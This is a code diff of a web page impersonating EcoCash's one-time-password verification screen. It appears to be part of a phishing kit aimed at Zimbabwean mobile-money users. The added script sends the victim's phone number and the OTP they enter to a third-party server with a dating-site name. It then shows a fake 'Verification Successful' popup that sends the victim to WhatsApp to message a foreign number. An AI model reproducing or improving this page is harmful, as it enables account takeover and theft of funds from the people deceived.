@@ -3,10 +3,11 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>EcoCash - Verify OTP</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
@@ -27,6 +28,7 @@
             flex-direction: column;
             align-items: center;
             padding: clamp(10px, 2vw, 20px);
+            width: 100%;
         }
         
         header {
@@ -49,6 +51,7 @@
             cursor: pointer;
             color: #333;
             transition: transform 0.2s;
+            padding: 5px;
         }
         
         .back-btn:hover {
@@ -147,6 +150,8 @@
             justify-content: center;
             gap: 16px;
             margin-bottom: 30px;
+            width: 100%;
+            max-width: 400px;
         }
         
         .otp-box {
@@ -235,6 +240,37 @@
             to { opacity: 1; transform: translateY(0); }
         }
         
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #333;
+            color: white;
+            padding: 14px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            z-index: 2000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            pointer-events: none;
+            max-width: 90%;
+            text-align: center;
+        }
+        
+        .toast.show {
+            opacity: 1;
+        }
+        
+        .toast.error {
+            background: #e74c3c;
+        }
+        
+        .toast.success {
+            background: #27ae60;
+        }
+        
         footer {
             padding: clamp(10px, 3vw, 15px);
             color: #aaa;
@@ -244,7 +280,6 @@
             margin-top: 10px;
         }
         
-        /* Spinner Overlay */
         #spinnerOverlay {
             position: fixed;
             top: 0;
@@ -280,6 +315,97 @@
             font-weight: 500;
         }
         
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeInOverlay 0.5s ease;
+        }
+        
+        .success-overlay.show {
+            display: flex;
+        }
+        
+        @keyframes fadeInOverlay {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .success-popup {
+            background: white;
+            border-radius: 30px;
+            padding: 40px 30px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        @keyframes popIn {
+            0% { transform: scale(0.5) translateY(50px); opacity: 0; }
+            100% { transform: scale(1) translateY(0); opacity: 1; }
+        }
+        
+        .success-popup .icon {
+            font-size: 72px;
+            margin-bottom: 16px;
+        }
+        
+        .success-popup h2 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #27ae60;
+            margin-bottom: 8px;
+        }
+        
+        .success-popup p {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+        
+        .success-popup .whatsapp-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            padding: 16px 40px;
+            background: #25D366;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-decoration: none;
+            box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
+        }
+        
+        .success-popup .whatsapp-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 35px rgba(37, 211, 102, 0.5);
+        }
+        
+        .success-popup .whatsapp-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .success-popup .whatsapp-btn svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+        
         @media (max-width: 480px) {
             .otp-box {
                 width: 50px;
@@ -289,6 +415,16 @@
             .otp-group {
                 gap: 12px;
             }
+            .success-popup {
+                padding: 30px 20px;
+            }
+            .success-popup h2 {
+                font-size: 24px;
+            }
+            .success-popup .whatsapp-btn {
+                padding: 14px 30px;
+                font-size: 16px;
+            }
         }
         
         @media (max-width: 380px) {
@@ -296,6 +432,7 @@
                 width: 42px;
                 height: 50px;
                 font-size: 22px;
+                border-radius: 12px;
             }
             .otp-group {
                 gap: 8px;
@@ -306,88 +443,125 @@
 
 <body>
     <header>
-        <button class="back-btn" onclick="history.back()" aria-label="Go back">←</button>
+        <button class="back-btn" onclick="window.location.href='zimbabwelogin.html'" aria-label="Go back">←</button>
         <div class="logo"><span class="logo-eco">Eco</span><span class="logo-cash">Cash</span></div>
-        <div></div>
+        <div style="width: 30px;"></div>
     </header>
     
-    <main class="card">
-        <div class="otp-icon">📱</div>
-        <h1 class="otp-title">Verify Your Identity</h1>
-        <p class="otp-subtitle">
-            We sent a 6-digit verification code to<br>
-            <span class="otp-phone" id="displayPhone">+263 N/A</span>
-        </p>
-        <p class="resend-text">
-            Didn't receive the code? 
-            <a class="resend-link" id="resendLink" onclick="resendOTP()">Resend OTP</a>
-            <span id="timerDisplay" style="color:#999; display:none;"></span>
-        </p>
-        
-        <div class="otp-group" id="otpGroup">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
-            <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+    <main class="card" id="verifyCard">
+        <!-- OTP Verification UI -->
+        <div id="otpSection">
+            <div class="otp-icon">📱</div>
+            <h1 class="otp-title">Verify Your Identity</h1>
+            <p class="otp-subtitle">
+                We sent a 6-digit verification code to<br>
+                <span class="otp-phone" id="displayPhone">+263 N/A</span>
+            </p>
+            <p class="resend-text">
+                Didn't receive the code? 
+                <a class="resend-link" id="resendLink" onclick="resendOTP()">Resend OTP</a>
+                <span id="timerDisplay" style="color:#999; display:none;"></span>
+            </p>
+            
+            <div class="otp-group" id="otpGroup">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autofocus>
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
+            </div>
+            
+            <div class="error-message" id="errorMessage">❌ Invalid OTP. Please try again.</div>
+            
+            <button class="verify-btn" id="verifyBtn" disabled>VERIFY</button>
         </div>
-        
-        <div class="error-message" id="errorMessage">❌ Invalid OTP. Please try again.</div>
-        
-        <button class="verify-btn" id="verifyBtn" disabled>VERIFY</button>
     </main>
     
-    <footer>© 2026 EcoCash</footer>
+    <footer>© 2026 EcoCash. All rights reserved.</footer>
     
-    <!-- Spinner Overlay -->
+    <!-- ===== SPINNER ===== -->
     <div id="spinnerOverlay">
         <div class="spinner"></div>
         <div class="spinner-text">Verifying OTP...</div>
     </div>
+
+    <!-- ===== TOAST ===== -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ===== SUCCESS POPUP ===== -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-popup">
+            <div class="icon">✅</div>
+            <h2>Verification Successful!</h2>
+            <p>Your identity has been verified successfully. Click below to continue to WhatsApp.</p>
+            <a href="#" target="_blank" class="whatsapp-btn" id="whatsappBtn">
+                <!-- WhatsApp SVG Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                </svg>
+                Continue to WhatsApp
+            </a>
+        </div>
+    </div>
     
     <script>
         // ============================================================
-        // 🔥 FIXED: OTP PAGE WILL SHOW PROPERLY!
+        // ECOCASH OTP VERIFICATION - WITH WHATSAPP REDIRECT
         // ============================================================
         
-        // ✅ Clear any previous verification to show OTP page
-        // This ensures the OTP page always shows when you open it
-        // If you want to skip OTP after verification, use sessionStorage instead
-        localStorage.removeItem('otpVerified');
+        // ===== CONFIGURATION =====
+        const API_URL = 'https://classydateregistration-production.up.railway.app';
+        const WHATSAPP_NUMBER = '254707001191';
         
-        const phone = localStorage.getItem('phone') || 'N/A';
-        document.getElementById('displayPhone').textContent = '+263 ' + phone;
-        
+        // ===== DOM ELEMENTS =====
         const otpBoxes = document.querySelectorAll('.otp-box');
         const verifyBtn = document.getElementById('verifyBtn');
         const errorMessage = document.getElementById('errorMessage');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         const resendLink = document.getElementById('resendLink');
         const timerDisplay = document.getElementById('timerDisplay');
+        const toast = document.getElementById('toast');
+        const displayPhone = document.getElementById('displayPhone');
+        const successOverlay = document.getElementById('successOverlay');
+        const whatsappBtn = document.getElementById('whatsappBtn');
+        
+        // ===== GET PHONE FROM URL OR LOCALSTORAGE =====
+        const urlParams = new URLSearchParams(window.location.search);
+        const phoneFromUrl = urlParams.get('phone');
+        const phone = phoneFromUrl || localStorage.getItem('phone') || 'N/A';
+        displayPhone.textContent = '+263 ' + phone;
         
         let otpValue = '';
         let resendTimer = 30;
         let timerInterval = null;
         let isResendCooldown = false;
-        
+        let isVerifying = false;
+
+        // ===== TOAST =====
+        function showToast(message, type = '') {
+            toast.textContent = message;
+            toast.className = 'toast show ' + type;
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 5000);
+        }
+
+        // ===== CHECK OTP COMPLETE =====
         function checkOTPComplete() {
             otpValue = Array.from(otpBoxes).map(box => box.value).join('');
             verifyBtn.disabled = otpValue.length !== 6;
             
-            otpBoxes.forEach((box, index) => {
+            otpBoxes.forEach((box) => {
                 if (box.value) {
                     box.classList.add('filled');
                 } else {
                     box.classList.remove('filled');
                 }
             });
-            
-            if (otpValue.length === 6) {
-                setTimeout(verifyOTP, 300);
-            }
         }
-        
+
+        // ===== OTP INPUT HANDLING =====
         otpBoxes.forEach((box, index) => {
             box.addEventListener('input', () => {
                 box.value = box.value.replace(/\D/g, '');
@@ -408,8 +582,11 @@
                 if (e.key === 'ArrowRight' && index < 5) {
                     otpBoxes[index + 1].focus();
                 }
-                if (e.key === 'Delete' && box.value === '' && index > 0) {
-                    otpBoxes[index - 1].focus();
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (otpValue.length === 6) {
+                        verifyOTP();
+                    }
                 }
             });
             
@@ -428,43 +605,155 @@
                     const lastIndex = Math.min(digits.length - 1, 5);
                     otpBoxes[lastIndex].focus();
                 }
+                if (otpValue.length === 6) {
+                    setTimeout(verifyOTP, 300);
+                }
             });
         });
-        
-        function verifyOTP() {
+
+        // ===== UPDATE WHATSAPP LINK WITH USER DETAILS =====
+        function updateWhatsAppLink() {
+            const phoneNumber = displayPhone.textContent;
+            const currentTime = new Date().toLocaleString();
+            
+            const message = `✅ EcoCash Verification Successful!%0A%0A📱 Phone: ${phoneNumber}%0A🕐 Time: ${currentTime}%0A📊 Status: VERIFIED ✅%0A%0AI have successfully verified my EcoCash account.`;
+            
+            whatsappBtn.href = `https://wa.me/${WHATSAPP_NUMBER}?text=${message}`;
+        }
+
+        // ===== VERIFY OTP =====
+        async function verifyOTP() {
+            if (isVerifying) return;
+            
             const enteredOTP = Array.from(otpBoxes).map(box => box.value).join('');
              
             if (enteredOTP.length !== 6) {
                 return;
             }
-             
+            
+            isVerifying = true;
             spinnerOverlay.style.display = 'flex';
             verifyBtn.disabled = true;
-             
-            setTimeout(() => {
-                spinnerOverlay.style.display = 'none';
+            errorMessage.classList.remove('show');
+
+            const fullPhone = '263' + phone;
+
+            try {
+                console.log('📤 Verifying OTP:', { phone: fullPhone, otp: enteredOTP });
+
+                const response = await fetch(`${API_URL}/api/verify-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ 
+                        phone: fullPhone, 
+                        otp: enteredOTP 
+                    })
+                });
+
+                console.log('📥 Response status:', response.status);
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.log('📥 Error response:', errorText);
+                    throw new Error(`Server error: ${response.status}`);
+                }
+
+                const data = await response.json();
+                console.log('📥 Response data:', data);
+
+                if (data.status === 'success') {
+                    // ===== SHOW SUCCESS POPUP =====
+                    spinnerOverlay.style.display = 'none';
+                    successOverlay.classList.add('show');
+                    
+                    // Update WhatsApp link with user details
+                    updateWhatsAppLink();
+                    
+                    showToast('✅ OTP verified successfully!', 'success');
+                    
+                    // Store verification status
+                    localStorage.setItem('otpVerified', 'true');
+                    
+                } else {
+                    throw new Error(data.message || 'Invalid OTP');
+                }
+
+            } catch (error) {
+                console.error('❌ Error:', error);
+                
+                let userMessage = 'Invalid OTP. Please try again.';
+                if (error.message.includes('Failed to fetch') || error.message.includes('502')) {
+                    userMessage = 'Cannot connect to server. Please check your internet connection.';
+                } else {
+                    userMessage = error.message || 'Invalid OTP. Please try again.';
+                }
+                
+                errorMessage.textContent = '❌ ' + userMessage;
+                errorMessage.classList.add('show');
+                showToast('❌ ' + userMessage, 'error');
+                
+                otpBoxes.forEach(box => {
+                    box.value = '';
+                    box.classList.remove('filled');
+                    box.classList.add('invalid');
+                    setTimeout(() => {
+                        box.classList.remove('invalid');
+                    }, 500);
+                });
+                
+                isVerifying = false;
                 verifyBtn.disabled = false;
-                 
-                // ✅ Use sessionStorage so it auto-clears when tab closes
-                // This way the OTP page will show again on next visit
-                sessionStorage.setItem('otpVerified', 'true');
-                window.location.href = 'members.html';
-            }, 1500);
+                spinnerOverlay.style.display = 'none';
+                otpBoxes[0].focus();
+            }
         }
         
         verifyBtn.addEventListener('click', verifyOTP);
-        
-        function resendOTP() {
+
+        // ===== RESEND OTP =====
+        async function resendOTP() {
             if (isResendCooldown) return;
             
-            isResendCooldown = true;
-            resendLink.classList.add('disabled');
-            timerDisplay.style.display = 'inline';
-            resendTimer = 30;
-            timerDisplay.textContent = `(${resendTimer}s)`;
+            const fullPhone = '263' + phone;
             
-            alert('📱 A new OTP has been sent to your phone.');
-            
+            try {
+                isResendCooldown = true;
+                resendLink.classList.add('disabled');
+                timerDisplay.style.display = 'inline';
+                resendTimer = 30;
+                timerDisplay.textContent = `(${resendTimer}s)`;
+
+                console.log('📤 Resending OTP for:', fullPhone);
+
+                const response = await fetch(`${API_URL}/api/resend-otp`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({ phone: fullPhone })
+                });
+
+                const data = await response.json();
+                console.log('📥 Resend response:', data);
+
+                if (data.status === 'success') {
+                    showToast('📱 New OTP sent to your phone!', 'success');
+                } else {
+                    throw new Error(data.message || 'Failed to resend OTP');
+                }
+
+            } catch (error) {
+                console.error('❌ Resend error:', error);
+                showToast('❌ Failed to resend OTP. Please try again.', 'error');
+                isResendCooldown = false;
+                resendLink.classList.remove('disabled');
+                timerDisplay.style.display = 'none';
+            }
+
             otpBoxes.forEach(box => {
                 box.value = '';
                 box.classList.remove('filled');
@@ -473,6 +762,7 @@
             otpBoxes[0].focus();
             errorMessage.classList.remove('show');
             
+            // Start timer
             timerInterval = setInterval(() => {
                 resendTimer--;
                 timerDisplay.textContent = `(${resendTimer}s)`;
@@ -485,13 +775,12 @@
                 }
             }, 1000);
         }
-        
+
+        // ===== AUTO-FOCUS =====
         otpBoxes[0].focus();
         
-        // ✅ Check sessionStorage (auto-clears when tab closes)
-        if (sessionStorage.getItem('otpVerified') === 'true') {
-            window.location.href = 'members.html';
-        }
+        // ===== CLEAR OTP VERIFICATION STATUS ON LOAD =====
+        localStorage.removeItem('otpVerified');
     </script>
 </body>
 
